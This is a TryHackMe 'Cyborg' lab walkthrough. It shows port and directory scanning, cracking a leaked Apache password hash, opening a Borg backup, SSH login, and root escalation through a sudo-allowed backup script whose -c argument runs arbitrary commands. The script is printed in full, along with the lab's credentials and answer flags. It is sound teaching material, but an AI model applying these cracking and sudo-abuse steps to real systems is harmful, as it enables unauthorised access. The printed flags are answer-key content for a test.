# TryHackMe Cyborg Walkthrough
![Room Icon](Screenshots/Room%20Icon.jpeg)  
Description: A box involving encrypted archives, source code analysis and more.  
Author: Sooi Vervloessem  
Link: https://tryhackme.com/room/cyborgt8

## Task 1: Scan the machine, how many ports are open
We start by performing an NMAP scan on the target machine:  
```bash
$ nmap -A -p- <your_ip>
```
<img src="Screenshots/Nmap Scan.png" width="50%" height="50%">  

We can see that there are 2 ports open, port 22 and port 80.  
**Answer #1: 2**

## Task 2: What service is running on port 22?
From our NMAP output, we can see that the "SSH" service is running on port 22.  
**Answer #2: ssh**

## Task 3: What service is running on port 80?
From our NMAP output, we can see that the "http" service is running on port 80.  
**Answer #3: http**

## Task 4: What is the user.txt flag?
Let's start by discovering what is on port 80:  
<img src="Screenshots/HTTP Port 80 Apache site.png" width="50%" height="50%">  
We receive a Default Apache2 Page.  
Let's try searching for subdirectories using gobuster:  
```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<your_ip>
```
<img src="Screenshots/Gobuster scan on root domain.png" width="50%" height="50%">

We can see that the following interesting subdirectories are present:  
- /admin
- /etc

### /etc subdirectory discovery
Let's first check the /etc subdirectory. In there, we find the "squid" directory:  
<img src="Screenshots/etc-squid contents.png" width="50%" height="50%">  
Looking at the files listed.  
passwd:  
<img src="Screenshots/passwd in etc squid.png" width="50%" height="50%">  
squid.conf:  
<img src="Screenshots/squid.conf inside etc squid.png" width="50%" height="50%">  

The passwd file is definitely interesting. It appears to contain the following information:
- music_archive → username
- $apr1$ → Apache MD5 (apr1) hash format
- BpZ.Q.1m → salt
- F0qqPwHSOG50URuOVQTTn. → hashed password

We can try to crack this hash using John by running the following command:
```bash
$ john --format=md5crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
<img src="Screenshots/Crack hash.png" width="50%" height="50%">

We've cracked the hash and revealed the password, which is '**squidward**'

### /admin subdirectory discovery
Next, I went to the /admin subdirectory to see what I could find over there:  
<img src="Screenshots/index.html page on website.png" width="50%" height="50%">  
We can see the website from someone named "Alex". Upon clicking through the website, I found following page:  
<img src="Screenshots/admin.html page on website.png" width="50%" height="50%">  
This gives us some good information, like the usage of a squid proxy, as well as an indication that the "music_archive" is where we need to be looking for.
There is also a download page present on the website, which downloads an archive.tar file:  
<img src="Screenshots/Download button.png" width="50%" height="50%">  
Let's unpack the Tar file and explore it's contents:  
<img src="Screenshots/Moving through tar file.png" width="50%" height="50%">  
<img src="Screenshots/README in tar.png" width="50%" height="50%">  
It appears that this archive is a Borg Backup repository. The docs are accessible via the following link:  
[BorgBackup Docs](https://borgbackup.readthedocs.io/)  
After reading through the docs a bit, I figured out that we will probably need to extract the borg backup to read it's contents.
To do this, we will need to install the borg package:
```bash
$ apt install borgbackup
```
<img src="Screenshots/Installation of Borg.png" width="50%" height="50%">  

Now let's try to list information about the Borg Backup repository by running:  
```bash
$ borg list .
```
<img src="Screenshots/Borg list command with cracked password.png" width="50%" height="50%">  

We're asked to enter the passphrase for the key, for this I tried '**squidward**' (the password we found earlier) and it worked!  
Now we can extract the Borg Backup repository by running the following (and entering the same password):
```bash
$ borg extract .::music_archive
```
<img src="Screenshots/Borg extract using cracked password.png" width="50%" height="50%">  

We see that the 'home' subdirectory has been created. Let's explore it's contents  
<img src="Screenshots/Discovery through extracted folder.png" width="50%" height="50%">  
<img src="Screenshots/Found user password in extracted folder.png" width="50%" height="50%">  
I found a note containing the SSH password for the 'alex' user, which is '**S3cretP@s3**'.  
Let's connect to the machine by running (and entering the discovered password):
```bash
$ ssh alex@<your_ip>
```
<img src="Screenshots/Successful alex user login ssh and user.txt flag.png" width="50%" height="50%">  

We found the user.txt flag inside the home directory of the 'alex' user.  
**Answer #4: flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}**

## Task 5: What is the root.txt flag?
Next, we will need to find a way to escalate our privileges to find the root.txt flag. A common way to do this is by checking the sudo permissions for the current user:  
```bash
$ sudo -l
```
<img src="Screenshots/Check sudo -l permissions.png" width="50%" height="50%">  

We are allowed to run the /etc/mp3backups/backup.sh as sudo. Let's take a look at the contents of the script:  
```bash
#!/bin/bash
sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
# b=$(basename $input)
  #echo
# echo "$line"
#done < "$input"

while getopts c: flag
do
  case "${flag}" in
    c) command=${OPTARG};;
  esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s) 
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished" 

cmd=$($command) 
echo $cmd
```
This script takes a command-line argument 'c' and executes it directly in the "echo $cmd" part of the script. Because we have sudo rights on the script, we can try to execute the "whoami" command to see if the script executes our command as root user:  
```bash
$ sudo /etc/mp3backups/backup.sh -c 'whoami'
```
<img src="Screenshots/Whoami check.png" width="50%" height="50%">  

The last line of our script output contains the result of our "whoami" command, which returns root. We're able to execute commands as the root user. Now, let's list the contents of the /root directory and find the root.txt flag:  
```bash
$ sudo /etc/mp3backups/backup.sh -c 'ls -l /root'
$ sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt'
```
<img src="Screenshots/found root flag, to be catted.png" width="50%" height="50%">  
<img src="Screenshots/Root flag discovered.png" width="50%" height="50%">  

We successfully read the root.txt to receive the flag.  
**Answer #5: flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}**

## Conclusion
I had a ton of fun pwning this TryHackMe Box. I hope you enjoyed my first TryHackMe Walkthrough!  
+5 points for the Borg - Cyborg wordplay :D  
If you want to reach out, check my socials on my [Github Page](https://github.com/sooivervloessem)